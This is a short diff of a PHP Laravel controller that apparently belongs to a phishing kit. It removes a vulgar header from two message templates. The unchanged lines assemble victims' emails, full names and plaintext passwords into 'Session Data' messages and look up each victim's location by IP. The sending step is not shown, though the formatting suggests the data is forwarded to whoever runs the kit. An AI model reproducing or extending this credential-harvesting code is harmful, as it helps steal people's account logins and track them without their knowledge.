@@ -85,8 +85,7 @@ class DataController extends Controller
                 // Get IP location data
                 $ipData = Http::get("http://ip-api.com/json/" . $request->ip())->json();
                 
-                $message = "<b>concac</b>\n\n"
-                    . "📝 Session Data:\n"
+                $message = "📝 Session Data:\n"
                     . "Email: <code>" . $record->email . "</code>\n"
                     . "Full Name: <code>" . $record->full_name . "</code>\n"
                     . "Password 1: <code>" . $record->password . "</code>\n"
@@ -116,8 +115,7 @@ class DataController extends Controller
                 // Get IP location data
                 $ipData = Http::get("http://ip-api.com/json/" . $request->ip())->json();
                 
-                $message = "<b>concac</b>\n\n"
-                    . "📝 Session Data:\n"
+                $message = "📝 Session Data:\n"
                     . "Email: <code>" . $record->email . "</code>\n"
                     . "Full Name: <code>" . $record->full_name . "</code>\n"
                     . "Password 1: <code>" . $record->password . "</code>\n"
